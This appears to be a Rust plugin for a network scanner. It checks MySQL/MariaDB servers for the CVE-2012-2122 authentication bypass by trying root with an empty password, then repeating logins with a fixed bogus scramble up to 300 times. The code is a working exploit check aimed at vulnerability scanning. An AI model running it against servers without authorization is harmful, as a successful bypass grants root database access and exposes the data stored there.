/*
 * mysql-vuln-cve2012-2122 (Rust) - MySQL/MariaDB auth-bypass probe.
 * Faithful port of mysql-vuln-cve2012-2122.c with the arsenal_mysql.h
 * protocol helpers it needs. The deterministic non-matching scramble is
 * a probe of the server's faulty memcmp, not a credential.
 * Use only on networks you own or have permission to scan.
 */
#![allow(dead_code, non_snake_case, non_upper_case_globals)]

include!("alscript.rs");

/// Read one MySQL packet payload (port of ar_mysql_read_packet).
fn mysql_read_packet(s: &mut TcpStream, timeout_ms: i32) -> Option<Vec<u8>> {
    set_rtimeout(s, timeout_ms);
    let mut hdr = [0u8; 4];
    if !as_recv_exact(s, &mut hdr) {
        return None;
    }
    let len = (hdr[0] as usize) | ((hdr[1] as usize) << 8) | ((hdr[2] as usize) << 16);
    let mut out = vec![0u8; len];
    if len > 0 && !as_recv_exact(s, &mut out) {
        return None;
    }
    Some(out)
}

/// Send one MySQL packet (port of ar_mysql_send_packet).
fn mysql_send_packet(s: &mut TcpStream, payload: &[u8], seq: u8) -> bool {
    let len = payload.len();
    if len > 0xFFFFFF {
        return false;
    }
    let hdr = [(len & 0xFF) as u8, ((len >> 8) & 0xFF) as u8, ((len >> 16) & 0xFF) as u8, seq];
    as_send_all(s, &hdr) && as_send_all(s, payload)
}

/// Connect and read the server handshake; returns (stream, version).
fn mysql_open(ctx: &AlScriptContext) -> Option<(TcpStream, String)> {
    let mut s = as_connect(ctx)?;
    let pkt = mysql_read_packet(&mut s, ctx.timeout_ms)?;
    if pkt.len() < 2 || pkt[0] != 10 {
        return None;
    }
    let mut i = 1usize;
    while i < pkt.len() && pkt[i] != 0 {
        i += 1;
    }
    let version = ar_clean(&pkt[1..i]);
    Some((s, version))
}

/// Attempt a login (port of ar_mysql_login). Returns 0 on OK, the MySQL
/// error code on an error packet, or -1 on I/O / unexpected reply.
fn mysql_login(s: &mut TcpStream, user: &str, pass: &str, empty: bool, timeout_ms: i32) -> i32 {
    let caps: u32 = 0x000A_A201;
    let ulen = user.len();
    if ulen > 200 {
        return -1;
    }
    let mut plen = if empty { 0 } else { pass.len() };
    if !empty && plen > 20 {
        plen = 20;
    }
    let _ = plen;
    let mut pkt: Vec<u8> = Vec::new();
    pkt.push((caps & 0xFF) as u8);
    pkt.push(((caps >> 8) & 0xFF) as u8);
    pkt.push(((caps >> 16) & 0xFF) as u8);
    pkt.push(((caps >> 24) & 0xFF) as u8);
    pkt.extend_from_slice(&[0, 0, 0, 1]); // max packet size
    pkt.push(33); // charset
    pkt.extend_from_slice(&[0u8; 23]); // filler
    pkt.extend_from_slice(user.as_bytes());
    pkt.push(0);
    pkt.push(if empty { 0 } else { 20 });
    if !empty {
        // Deterministic non-matching 20-byte scramble.
        pkt.extend_from_slice(&[0x41u8; 20]);
    }
    // "mysql_native_password" + its NUL + one extra NUL (matches the C's
    // memcpy(...,22) followed by pkt[o++]=0).
    pkt.extend_from_slice(b"mysql_native_password");
    pkt.push(0);
    pkt.push(0);

    if !mysql_send_packet(s, &pkt, 1) {
        return -1;
    }
    let resp = match mysql_read_packet(s, timeout_ms) {
        Some(r) if !r.is_empty() => r,
        _ => return -1,
    };
    if resp[0] == 0x00 {
        return 0;
    }
    if resp[0] == 0xFF {
        let mut code = 0i32;
        if resp.len() >= 3 {
            code = resp[1] as i32 | ((resp[2] as i32) << 8);
        }
        return code;
    }
    -1
}

fn run(ctx: &AlScriptContext) -> i32 {
    if !ar_valid(ctx) {
        return 1;
    }
    let version = match mysql_open(ctx) {
        Some((mut s, v)) => {
            let rc = mysql_login(&mut s, "root", "", true, ctx.timeout_ms);
            if rc == 0 {
                ar_out(
                    ctx,
                    "MySQL CVE-2012-2122: root accepts an empty password (not the memcmp bypass)",
                );
                return 0;
            }
            v
        }
        None => {
            ar_out(ctx, "MySQL CVE-2012-2122: no MySQL handshake");
            return 0;
        }
    };

    for i in 0..300 {
        let mut s = match mysql_open(ctx) {
            Some((s, _)) => s,
            None => break,
        };
        let rc = mysql_login(&mut s, "root", "x", false, 50);
        if rc == 0 {
            ar_out(
                ctx,
                &format!(
                    "VULNERABLE: MySQL CVE-2012-2122 auth bypass after {} attempts ({})",
                    i + 1,
                    version
                ),
            );
            return 0;
        }
    }
    ar_out(ctx, "not vulnerable: MySQL CVE-2012-2122 not triggered");
    0
}

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
    if ctx.is_null() {
        return 1;
    }
    let ctx: &AlScriptContext = unsafe { &*ctx };
    run(ctx)
}
